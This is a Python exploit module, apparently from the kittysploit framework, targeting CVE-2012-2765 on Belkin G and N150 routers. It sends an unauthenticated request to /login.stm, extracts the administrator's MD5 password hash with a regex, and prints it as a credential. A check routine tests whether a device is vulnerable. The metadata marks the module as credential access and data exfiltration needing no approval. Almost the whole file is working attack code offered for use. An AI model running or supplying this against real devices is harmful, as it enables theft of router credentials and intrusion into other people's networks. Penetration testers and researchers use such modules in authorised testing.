#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Belkin G & N150 Password Disclosure"""

import re

from kittysploit import *
from lib.protocols.http.http_client import Http_client



class Module(Auxiliary, Http_client):
    __info__ = {
        'name': 'Belkin G & N150 Password Disclosure',
        'description': "Module exploits Belkin G and N150 Password MD5 Disclosure vulnerability which allows fetching administration\\'s password in md5 format",
        'author': ['Aodrulez', 'Avinash Tangirala', 'Marcin Bury'],
        'cve': ['CVE-2012-2765'],
        'platform': Platform.LINUX,
        'references': ['http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2012-2765', 'https://www.exploit-db.com/exploits/17349/'],
        'tags': ['iot', 'router', 'disclosure', 'credentials', 'unauth', 'cve-2012-2765', 'auxiliary'],
        'agent': {
            'risk': 'active',
            'effects': ['credential_access', 'data_exfiltration'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['credentials', 'risk_signals'],
        },
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        response = self.http_request(
            method="GET",
            path="/login.stm",
        )
        if response is None:
            return

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            print_success("Exploit success")
            data = [('admin', val[0])]
            headers = ("Login", "MD5 Password")
            print_table(headers, *data)

        else:
            print_error("Exploit failed. Device seems to be not vulnerable.")
    def check(self):
        response = self.http_request(
            method="GET",
            path="/login.stm",
        )
        if response is None:
            return False  # target is not vulnerable

        val = re.findall(r'password\s?=\s?"(.+?)"', response.text)  # in some fw there are no spaces

        if len(val):
            return True  # target vulnerable

        return False  # target is not vulnerable
